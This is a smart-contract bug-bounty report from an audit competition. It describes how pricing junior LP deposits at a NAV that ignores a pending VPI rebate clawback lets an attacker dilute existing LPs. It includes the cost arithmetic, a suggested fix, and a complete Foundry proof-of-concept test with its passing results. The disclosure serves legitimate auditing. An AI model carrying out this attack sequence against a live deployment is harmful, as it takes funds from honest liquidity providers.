# \#97861 [SC-Critical] LP deposit NAV ignores the certain clawback of a VPI rebate, so an attacker mints junior shares cheaply and dilutes existing junior LPs

**Submitted on Nov 3rd 2026 at 16:29:44 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97861
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

A skew-reducing open pays the trader a VPI rebate out of pool cash, and the trader's lifetime VPI is clamped so the rebate is clawed back in full on close. That clawback is certain, but LP NAV has no term for it. For the time between the rebate and the clawback, NAV is lower than the pool's real value. A junior deposit activated by `settleLpEpoch` in that window is minted at the low NAV. After the clawback the NAV recovers and the depositor keeps its share of the difference. The attacker triggers the window itself, with its own short, and every call is permissionless.

### Vulnerability Details

NAV is built from pool cash, the price delta and trader claims only:

```solidity
// HousePoolAccountingLib.sol:60-78
uint256 terminalAssets = engineSnapshot.physicalAssets;            // pool.totalAssets()
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;  // price curves only
...
@>  snapshot.distributable = terminalAssets - terminalLiabilities; // no VPI receivable term
```

`terminalLpPriceDeltaAssets` is a sum of per-account price curves (`TerminalNavBookV2.sol:208-237`, `_terminalLpPriceDeltaAssetAtoms` `:320-349`) and takes no `vpiAccrued` or VPI reserve input.

1. A skew-reducing open pays the rebate from pool cash (`CfdEnginePlanLib.sol:718-748`: `rebateAssets = uint256(-cashDeltaBeforeTopUp)`, `poolCashBeforeTopUp = snap.poolCashAssets - rebateAssets`). The rebate is held in the trader's VPI reserve in the clearinghouse (`CfdEnginePlanLib.sol:343-356`), outside `pool.totalAssets()`. Pool NAV drops by `r`.
2. `settleLpEpoch` prices the deposit off that NAV (`TrancheVault.sol:1398-1410`, `quoteDepositFromState`): a smaller `pricingAssets` gives more shares.
3. Closing the offset claws the rebate back with certainty. The lifetime clamp forces lifetime VPI >= 0 (`CloseAccountingLib.sol:112-118`). NAV recovers by `r`, and the depositor owns fraction `f'` of junior, so it keeps `f'·r`.

The exclusion of VPI from NAV is written in `SECURITY.md:871-872` ("neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV") and `ACCOUNTING_SPEC.md:1064-1066`. That wording is about not inflating NAV with anticipated value. Neither doc nor the Known Limitations (`SECURITY.md:1328-1470`) says that a deposit activated while a rebate is outstanding is priced below real value at the expense of existing LPs. KNOWN-ISSUES S-30/S-31 cover VPI depth in close charges and S-4 covers deferred claims in skew capacity, which are different root causes.

### Impact Details

Deployed release parameters (`vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, 4 bps execution fee), senior 4M / junior 1M (depth 5M), honest long $2M at the skew cap, attacker junior deposit 9M (f' = 0.9):

- Rebate `r = k·S²/(2D) = 0.01 · (2M)² / (2 · 5M) = 4,000 USDG`.
- Attacker: 9M USDG buys 9,000,710.83 shares instead of 8,964,927.28 (+0.40%). Net **+1,994.91 USDG** after 1,600.20 USDG of its own fees.
- Honest junior principal: 1,004,855.30 -> 1,001,260.19 = **-3,595.11 USDG** per cycle (0.36% of junior). The extra 1,600 vs the attacker's profit is the attacker's fee to treasury.
- Break-even `f' = 1,600 / 4,000 = 0.40`, so the deposit must be about 0.67x the existing junior. `r` scales with `S²`: at skew $200k the attack loses (-124.21 USDG). Loss is linear in pool depth.
- Honest LPs still lose when the attacker does not profit (deposit 100k: attacker -1,238.35, honest junior -361.84 USDG).
- Needs honest skew near the cap and rotating capital for one epoch. Nothing privileged is used.

Invariant broken: LP entry and exit are priced off one terminal NAV snapshot (`SECURITY.md:851`, `HousePoolAccountingLib.sol:57`) that is meant to treat new and existing LPs symmetrically (`SECURITY.md:859-860`). Here the deposit is minted at a NAV understated by a fully backed clawback receivable.

### Mitigation

Include the outstanding negative-VPI clawback (`max(-vpiAccrued, 0)`, already tracked as a reserve) in the NAV used for LP activation and redemption. Alternatively, block deposit activation in an epoch where a skew-reducing open paid a rebate.

### References

- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78`: NAV without a VPI term
- `packages/perps/src/TerminalNavBookV2.sol:208-237, 320-349`: terminal delta, price curves only
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:343-356, 718-748`: rebate reserve and rebate paid from pool cash
- `packages/perps/src/libraries/CloseAccountingLib.sol:112-118`: lifetime VPI clamp (certain clawback)
- `packages/perps/src/TrancheVault.sol:1398-1410`: deposit pricing from NAV
- `packages/perps/SECURITY.md:851, 859-860, 871-872, 1328-1470`, `ACCOUNTING_SPEC.md:1064-1066`: VPI-outside-NAV design and Known Limitations

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/fpv_vpi/FpvVpiNavGap.t.sol` and run `cd packages/perps && forge test --offline --match-path test/fpv_vpi/FpvVpiNavGap.t.sol -vv`. It only depends on the repo's `BasePerpTest`, uses the real user surface (`OrderRouter.commitOrder`, untrusted keeper `executeOrder`, permissionless `settleLpEpoch`) and compares two identical runs, with and without the attacker's short.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {console2} from "forge-std/console2.sol";

contract FpvVpiNavGapTest is BasePerpTest {
    uint256 internal constant Q = 1e20; // 1 lot = $100 notional
    address internal constant HON_TRADER = address(0x40E57);
    address internal constant ATK_TRADER = address(0xA77AC4);
    address internal constant ATK_LP = address(0xA77A1F);
    address internal constant KEEP = address(0xE0EC);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
            baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 1_000_000e6; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 4_000_000e6; }

    function _freshData(uint256 price, uint64 prevPublish) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, uint64(vm.getBlockTimestamp()), prevPublish);
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _trade(address who, CfdTypes.Side side, uint256 lots, bool isClose) internal {
        uint256 margin;
        uint256 size = lots * Q;
        if (isClose) {
            (size,,,,,,) = engine.positions(who);
        } else {
            margin = lots * 100e6 / 20 + 50e6;
            _fundTrader(who, margin + 5e6);
        }
        vm.prank(who);
        uint64 oid = router.commitOrder(side, size, margin, 0, isClose);
        for (uint256 i; i < 4; ++i) {
            (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
            bytes[] memory d = _freshData(1e8, pv.commitTime);
            vm.prank(KEEP);
            OrderV3Types.ExecutionResult memory res = router.executeOrder(oid, d);
            if (res.status != OrderV3Types.LifecycleStatus.Pending) {
                require(res.terminalReason == OrderV3Types.TerminalReason.Executed, "order not executed");
                return;
            }
        }
        revert("stuck");
    }

    function _settle() internal {
        bytes[] memory d = _freshData(1e8, 0);
        vm.prank(KEEP);
        router.settleLpEpoch(d); // permissionless
    }

    struct Out { uint256 redeemed; int256 traderNet; uint256 juniorPrincipal; uint256 sharesGot; uint256 poolCashAtSettle; }

    function _run(bool attack, uint256 honestLots, uint256 dep) internal returns (Out memory o) {
        _trade(HON_TRADER, CfdTypes.Side.LONG, honestLots, false);
        settlementToken.mint(ATK_LP, dep);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), dep);
        uint256 rid = juniorVault.requestDeposit(dep, ATK_LP, ATK_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(rid));

        uint256 traderIn;
        if (attack) {
            // skew-REDUCING open: VPI rebate leaves pool cash, clawback receivable is not in NAV
            traderIn = honestLots * 100e6 / 20 + 50e6 + 5e6;
            _trade(ATK_TRADER, CfdTypes.Side.SHORT, honestLots, false);
        }
        o.poolCashAtSettle = pool.totalAssets();
        _settle();
        uint256 c = juniorVault.claimableDepositRequest(rid, ATK_LP);
        require(c == dep, "deposit not activated");
        vm.prank(ATK_LP);
        juniorVault.claimDeposit(rid, c, ATK_LP, ATK_LP);
        o.sharesGot = juniorVault.balanceOf(ATK_LP);
        if (attack) {
            _trade(ATK_TRADER, CfdTypes.Side.SHORT, 0, true); // clawback: NAV recovers
            o.traderNet = int256(clearinghouse.balanceAssets(ATK_TRADER)) - int256(traderIn);
        }
        _trade(HON_TRADER, CfdTypes.Side.LONG, 0, true);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        uint256 shares = juniorVault.maxRequestRedeem(ATK_LP);
        vm.prank(ATK_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(redeemId));
        _settle();
        uint256 cs = juniorVault.claimableRedeemRequest(redeemId, ATK_LP);
        uint256 b = settlementToken.balanceOf(ATK_LP);
        vm.prank(ATK_LP);
        juniorVault.claimRedeem(redeemId, cs, ATK_LP, ATK_LP);
        o.redeemed = settlementToken.balanceOf(ATK_LP) - b;
        o.juniorPrincipal = pool.juniorPrincipal();
    }

    function _diff(uint256 honestLots, uint256 dep) internal returns (int256 gain, int256 honestLoss) {
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1);
        router.updateMarkPrice(_freshData(1e8, 0));
        uint256 snap = vm.snapshotState();
        Out memory base = _run(false, honestLots, dep);
        vm.revertToState(snap);
        Out memory atk = _run(true, honestLots, dep);
        gain = int256(atk.redeemed) + atk.traderNet - int256(base.redeemed);
        honestLoss = int256(base.juniorPrincipal) - int256(atk.juniorPrincipal);
        console2.log("attacker junior shares for same USDG: base / attack", base.sharesGot, atk.sharesGot);
        console2.log("ATTACKER NET GAIN:");
        console2.logInt(gain);
        console2.log("HONEST JUNIOR LOSS (principal base - attack):");
        console2.logInt(honestLoss);
    }

    /// POSITIVE: honest skew at cap ($2M = 0.4 x 5M depth), attacker deposit 9M (f' ~ 0.9)
    function test_fpv_positive_atCapSkew_bigDeposit() public {
        (int256 gain, int256 loss) = _diff(20_000, 9_000_000e6);
        assertGt(gain, 1_900e6, "attacker profits >$1.9k per cycle");
        assertGt(loss, 3_500e6, "honest junior loses >$3.5k per cycle");
        assertGt(loss, gain, "loss exceeds gain: remainder is fees to treasury");
    }

    /// NEGATIVE 1: small honest skew ($200k). r ~ S^2, rebate tiny, attacker loses.
    function test_fpv_negative_smallSkew() public {
        (int256 gain,) = _diff(2_000, 9_000_000e6);
        assertLt(gain, 0, "attack unprofitable when skew is small");
    }

    /// NEGATIVE 2: small deposit (f' ~ 0.09). Attacker loses, honest LPs still lose f'*r.
    function test_fpv_negative_smallDeposit() public {
        (int256 gain, int256 loss) = _diff(20_000, 100_000e6);
        assertLt(gain, 0, "attack unprofitable with small deposit");
        assertGt(loss, 0, "but honest junior still loses (griefing component)");
    }
}
```

Result (actually run, `forge test --offline --match-path test/fpv_vpi/FpvVpiNavGap.t.sol -vv`; values in 6-decimal USDG):

```
[PASS] test_fpv_positive_atCapSkew_bigDeposit() (gas: 15393816)
  attacker junior shares for same USDG: base / attack 8964927280824860 9000710830833755
  ATTACKER NET GAIN:               1994911880    (+1,994.91 USDG)
  HONEST JUNIOR LOSS:              3595110317    (3,595.11 USDG)

[PASS] test_fpv_negative_smallSkew() (gas: 15364313)
  ATTACKER NET GAIN:               -124209135    (-124.21 USDG)
  HONEST JUNIOR LOSS:              35990850

[PASS] test_fpv_negative_smallDeposit() (gas: 15393782)
  ATTACKER NET GAIN:               -1238353487   (-1,238.35 USDG)
  HONEST JUNIOR LOSS:              361844228

Suite result: ok. 3 passed; 0 failed; 0 skipped
```

